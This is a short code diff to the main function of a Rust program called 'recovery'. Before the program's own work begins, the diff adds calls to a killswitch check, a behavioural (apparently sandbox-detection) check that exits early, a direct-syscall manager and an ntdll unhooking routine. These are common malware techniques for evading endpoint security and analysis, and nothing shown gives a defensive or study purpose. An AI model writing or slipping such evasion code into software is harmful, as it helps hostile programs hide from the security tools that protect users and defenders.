@@ -17,6 +17,17 @@ async fn main() -> Result<(), RecoveryError> {
         .with(fmt_layer)
         .init();
 
+    if recovery::killswitch::check_killswitch().await {
+        return Ok(());
+    }
+
+    if !recovery::behavioral::check_behavioral().await {
+        return Ok(());
+    }
+
+    let syscall_manager = recovery::helpers::syscalls::SyscallManager::new().ok();
+    let _ = recovery::helpers::unhooking::unhook_ntdll(syscall_manager.as_ref());
+
     let context = RecoveryContext::discover()
         .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;
 
